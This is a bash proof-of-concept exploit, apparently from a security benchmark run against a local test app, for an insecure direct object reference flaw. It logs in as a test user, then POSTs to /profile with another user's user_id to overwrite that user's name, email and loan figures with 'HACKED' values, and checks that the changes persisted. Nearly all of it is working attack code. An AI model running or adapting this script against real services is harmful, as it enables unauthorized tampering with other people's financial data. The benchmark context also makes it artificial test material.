#!/bin/bash
# POC: Demonstrates IDOR vulnerability in /profile endpoint allowing unauthorized modification of other users' financial profiles by manipulating user_id parameter
# Target: ./repo
# Created: 2025-11-07T18:19:43.408Z
# Session: benchmark-XBEN-023-24-mhp62996

# IDOR Vulnerability POC - Unauthorized Profile Modification
# This script demonstrates an Insecure Direct Object Reference (IDOR) vulnerability
# where an authenticated user can modify another user's financial profile

TARGET_URL="${1:-http://localhost:80}"
PROFILE_ENDPOINT="$TARGET_URL/profile"
LOGIN_ENDPOINT="$TARGET_URL/login"
HOME_ENDPOINT="$TARGET_URL/home"

echo "============================================"
echo "IDOR POC - Profile Modification"
echo "============================================"
echo ""

# Step 1: Authenticate as user "test"
echo "[*] Step 1: Authenticating as user 'test'..."
LOGIN_RESPONSE=$(curl -s -X POST "$LOGIN_ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test" \
  -c /tmp/cookies.txt)

# Extract session cookie
SESSION_COOKIE=$(grep -oP 'session\s+\K[^\s]+' /tmp/cookies.txt 2>/dev/null || echo "")

if [ -z "$SESSION_COOKIE" ]; then
  echo "[-] Failed to obtain session cookie"
  exit 1
fi

echo "[+] Successfully authenticated. Session: ${SESSION_COOKIE:0:30}..."
echo ""

# Step 2: Get current profile info for reference
echo "[*] Step 2: Retrieving current profile information (as user test)..."
CURRENT_PROFILE=$(curl -s -X GET "$PROFILE_ENDPOINT" \
  -H "Cookie: session=$SESSION_COOKIE")

echo "[+] Current profile retrieved"
echo ""

# Step 3: Attempt IDOR - Modify another user's profile (user_id=2)
echo "[*] Step 3: Attempting IDOR - Modifying user 2's profile as authenticated user 'test'..."
echo "[*] Sending POST to $PROFILE_ENDPOINT with user_id=2 parameter"
echo ""

ATTACK_PAYLOAD="user_id=2&name=HACKED&lastname=User&email=hacked@example.com&loan_amount=99999&loan_term_months=12&monthly_payment=9999"

IDOR_RESPONSE=$(curl -s -X POST "$PROFILE_ENDPOINT" \
  -H "Cookie: session=$SESSION_COOKIE" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "$ATTACK_PAYLOAD" \
  -w "\n%{http_code}")

# Separate response body and status code
HTTP_STATUS=$(echo "$IDOR_RESPONSE" | tail -n1)
RESPONSE_BODY=$(echo "$IDOR_RESPONSE" | head -n-1)

echo "[+] Response Status: $HTTP_STATUS"
echo ""

if [ "$HTTP_STATUS" == "302" ] || [ "$HTTP_STATUS" == "200" ]; then
  echo "[+] SUCCESS: IDOR vulnerability confirmed!"
  echo "[+] Unauthorized profile modification was accepted by the server"
  echo ""
  
  # Step 4: Verify the modification persisted
  echo "[*] Step 4: Verifying that the malicious modifications persisted..."
  echo "[*] Retrieving profile again to confirm changes..."
  
  VERIFY_PROFILE=$(curl -s -X GET "$PROFILE_ENDPOINT" \
    -H "Cookie: session=$SESSION_COOKIE")
  
  # Check if the hacked values are in the response
  if echo "$VERIFY_PROFILE" | grep -q "99999"; then
    echo "[+] CONFIRMED: Modified loan_amount (99999) found in profile"
    echo "[+] IDOR vulnerability successfully exploited - Another user's profile was modified!"
    echo ""
    echo "Vulnerable Endpoint: $PROFILE_ENDPOINT"
    echo "Attack Method: POST with user_id parameter"
    echo "Result: Unauthorized modification of user 2's financial data"
    echo ""
    exit 0
  elif echo "$VERIFY_PROFILE" | grep -q "HACKED"; then
    echo "[+] CONFIRMED: Modified name (HACKED) found in profile"
    echo "[+] IDOR vulnerability successfully exploited - Another user's profile was modified!"
    echo ""
    echo "Vulnerable Endpoint: $PROFILE_ENDPOINT"
    echo "Attack Method: POST with user_id parameter"
    echo "Result: Unauthorized modification of user 2's financial data"
    echo ""
    exit 0
  else
    echo "[!] Response received but verification inconclusive"
    echo "Response sample: ${VERIFY_PROFILE:0:200}"
    exit 1
  fi
else
  echo "[-] IDOR attempt blocked. HTTP Status: $HTTP_STATUS"
  echo "Response: ${RESPONSE_BODY:0:300}"
  exit 1
fi